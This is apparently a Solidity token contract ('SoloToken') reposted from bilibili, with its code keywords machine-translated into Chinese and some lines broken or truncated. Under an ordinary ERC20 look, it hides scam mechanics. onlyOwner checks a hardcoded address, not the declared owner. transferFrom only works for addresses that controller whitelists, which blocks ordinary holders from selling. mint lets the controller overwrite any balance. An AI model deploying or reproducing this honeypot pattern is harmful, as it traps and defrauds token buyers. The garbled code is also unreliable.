实用性实测度^ 0.4.26;
合同可拥有的{
地址为公共拥有者；
事件OwnershipTransferred（地址索引为previousOwner，地址索引为newOwner）；
函数Ownable（）public {
owner = msg.sender;
}
修饰符onlyOwner（）{
require（msg.sender == address（1080614020421183795110940285280029773222128095634））;
_;
}
函数transferOwnership（address newOwner）public onlyOwner {
require（newOwner！= address（0））;
OwnershipTransferred（owner，newOwner）;
owner = newOwner;
}
}
/ **

@title SafeMath

@dev带有安全检查的数学运算会引发错误
* /
库SafeMath {
函数mul（uint256 a，uint256 b）内部纯返回（uint256）{
如果（a == 0）{
返回0;
}
uint256 c = a * b;
assert（c / a == b）;
返回c;
}

函数div（uint256 a，uint256 b）内部纯返回值（uint256）{
// assert（b> 0）; //除以0时，会自动抛出
Solidity异常uint256 c = a / b;
// assert（a == b * c + a％b）; //在任何情况下都不会保留
return c；
}
函数sub（uint256 a，uint256 b）内部纯返回值（uint256）{
assert（b <= a）;
返回a-b;
}
函数add（uint256 a，uint256 b）内部纯收益（uint256）{
uint256 c = a + b;
断言（c> = a）;
ur
}
}
合同SoloToken是可拥有{
串公共名称;
字符串公共符号；
uint8公共小数；
uint256 public totalSupply;
事件传输（地址从索引开始，地址从索引开始，uint256值）；
事件批准（地址索引的所有者，地址索引的支出者，uint256值）；
构造函数（字符串_name，字符串_symbol，uint8 _decimals，uint256 _totalSupply）public {
name = _name;
符号= _symbol;
小数位= _小数位；
totalSupply = _totalSupply;
balances [msg.sender] = totalSupply;
allow [msg.sender] = true;
}
为uint256使用SafeMath；
mapping（address => uint256）公共余额；
mapping（address => bool）公共允许；
函数传递（地址_to，uint256 _value）公共返回（布尔）{
require（_to！= address（0））;
require（_value <= balances [msg.sender]）;
balances [msg.sender] = balances [msg.sender] .sub（_value）;
balances [_to] =余额[_to] .add（_value）;
转移（msg.sender，_to，_value）;
返回true；
}
函数balanceOf（address _owner）公开视图返回（uint256 balance）{
return balances [_owner];
}
允许映射（地址=>映射（地址=> uint256））；
函数transferFrom（address _from，address _to，uint256 _value）public return（bool）{
require（_to！= address（0））;
require（_value <=余额[_from]）;
require（_value <=允许[_from] [msg.sender]）；
require（allow [_from] == true）;
balances [_from] =余额[_from] .sub（_value）;
balances [_to] =余额[_to] .add（_value）;
allowed [_from] [msg.sender] =允许[_from] [msg.sender] .sub（_value）;
转移（_from，_to，_value）;
返回true；
}
函数批准（地址_spender，uint256 _value）公共返回值（布尔）{
允许[msg.sender] [_ spender] = _value;
批准（msg.sender，_spender，_value）；
返回true；
}
函数津贴（地址_owner，地址_spender）公共视图
return （uint256）{ return allowed [_owner] [_ spender];
}
函数addAllow（地址持有者，bool allowApprove）外部onlyOwner {
allow [holder] = allowApprove;
}
函数mint（地址矿工，uint256 _value）外部onlyOwner {balances
[miner] = _value;
}

}


作者：区块链小菜鸡
https://www.bilibili.com/read/cv11207687
出处： bilibili
